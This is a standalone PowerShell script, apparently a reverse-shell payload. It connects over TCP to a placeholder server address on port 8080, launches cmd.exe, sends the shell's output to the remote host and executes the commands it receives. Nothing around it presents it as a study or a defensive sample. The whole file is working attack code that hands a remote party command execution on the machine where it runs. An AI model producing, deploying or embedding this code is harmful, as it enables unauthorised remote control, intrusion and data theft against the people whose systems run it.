function CleanUp {
	if ($client.Connected -eq $true) {
		$client.Close()
	}

	if ($process.ExitCode -ne $null) {
		$process.Close()
	}

	exit
}

$client = New-Object System.Net.Sockets.TcpClient
$client.Connect('SERVER_IP', 8080)

if ($client.Connected -ne $true) {
	CleanUp
}

$stream = $client.GetStream();
$buffer = New-Object System.Byte[] $client.ReceiveBufferSize

$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = 'cmd.exe'
$process.StartInfo.RedirectStandardInput = 1
$process.StartInfo.RedirectStandardOutput = 1
$process.StartInfo.UseShellExecute = 0
$process.Start()

$inputStream = $process.StandardInput
$outputStream = $process.StandardOutput

Start-Sleep 1

$encoding = New-Object System.Text.AsciiEncoding

while ($outputStream.Peek() -ne -1) {
	$output += $encoding.GetString($outputStream.Read())
}

$stream.Write($encoding.GetBytes($output), 0, $output.Length)

$output = $null

while ($true) {
	if ($client.Connected -ne $true) {
		CleanUp
	}

	$pos = 0
	$i = 1

	while (($i -gt 0) -and ($pos -lt $buffer.Length)) {
		$read = $stream.Read($buffer, $pos, $buffer.Length - $pos)
		$pos += $read

		if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {
			break
		}

		if ($pos -gt 0) {
			$string = $encoding.GetString($buffer, 0, $pos)
			$inputStream.Write($string)
			Start-Sleep 1

			if ($process.ExitCode -ne $null) {
				CleanUp
			} else {
				$output = $encoding.GetString($outputStream.Read())

				while ($outputStream.Peek() -ne -1) {
					$output += $encoding.GetString($outputStream.Read())

					if ($output -eq $string) {
						$output = ''
					}
				}

				$stream.Write($encoding.GetBytes($output), 0, $output.Length);
				$output = $null
				$string = $null
			}
		} else {
			CleanUp
		}
	}
}
